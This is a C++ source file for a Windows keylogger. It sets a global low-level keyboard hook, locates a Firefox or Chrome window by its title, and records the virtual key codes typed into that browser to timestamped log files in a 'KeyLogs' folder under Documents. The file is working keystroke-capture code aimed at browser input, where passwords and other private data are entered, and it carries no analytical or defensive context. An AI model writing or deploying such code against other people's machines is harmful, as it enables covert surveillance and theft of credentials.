#include <Windows.h>
#include <fstream>
#include <ctime>
#include <iomanip>
#include <locale>
#include <iostream>
#include <string>
#include <codecvt>
#include <knownfolders.h>
#include <shlobj.h>

// Global variables
std::ofstream logFile;
HHOOK keyboardHook = nullptr;
HWND browserWindow = nullptr;

// Function to handle key press and write to log file
void HandleKeyPress(DWORD vkCode)
{
    if (logFile.is_open() && browserWindow != nullptr && GetForegroundWindow() == browserWindow)
    {
        logFile << vkCode << " ";
    }
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // Extract key information from the event
        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;

        // Check if a key is being pressed (key down event)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Handle the key press
            HandleKeyPress(vkCode);
        }
    }

    // Pass the event to the next hook procedure
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// Function to find the browser window
BOOL CALLBACK EnumWindowsProc(HWND hwnd, [[maybe_unused]] LPARAM lParam)
{
    char class_name[80];
    GetClassName(hwnd, class_name, sizeof(class_name));

    std::string windowTitle;
    char windowTitleBuffer[256];
    GetWindowTextA(hwnd, windowTitleBuffer, sizeof(windowTitleBuffer));
    windowTitle = windowTitleBuffer;

    // Check if the window belongs to a supported browser
    if (windowTitle.find("Mozilla Firefox") != std::string::npos ||
        windowTitle.find("Google Chrome") != std::string::npos)
    {
        // Store the browser window handle
        browserWindow = hwnd;
        return FALSE;
    }

    return TRUE;
}

// Entry point of the application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Get the current application path
    char appPath[MAX_PATH];
    GetModuleFileNameA(nullptr, appPath, sizeof(appPath));

    // Get the "Documents" folder path
    PWSTR documentsPath = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath)))
    {
        MessageBox(nullptr, "Failed to get the Documents folder path.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Convert wide string to narrow string
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::string documentsPathStr = converter.to_bytes(documentsPath);

    // Create the "KeyLogs" directory in the "Documents" folder
    std::string keyLogsDir = documentsPathStr + "\\KeyLogs";
    CreateDirectoryA(keyLogsDir.c_str(), nullptr);

    // Create a filename based on the current date and time
    std::stringstream ss;
    std::time_t currentTime = std::time(nullptr);
    std::tm* localTime = std::localtime(&currentTime);
    ss << keyLogsDir << "\\LOG"
       << std::put_time(localTime, "%Y%m%d_%H%M%S")
       << ".txt";

    // Open the log file in append mode
    logFile.open(ss.str(), std::ios_base::app);
    if (!logFile.is_open())
    {
        MessageBox(nullptr, "Failed to open the log file.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Enumerate all windows to find the browser window
    EnumWindows(EnumWindowsProc, NULL);

    if (browserWindow == nullptr)
    {
        MessageBox(nullptr, "No supported browser window found.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Set up the keyboard hook
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);
    if (keyboardHook == nullptr)
    {
        MessageBox(nullptr, "Failed to set up the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    UnhookWindowsHookEx(keyboardHook);
    logFile.close();

    return static_cast<int>(msg.wParam);
}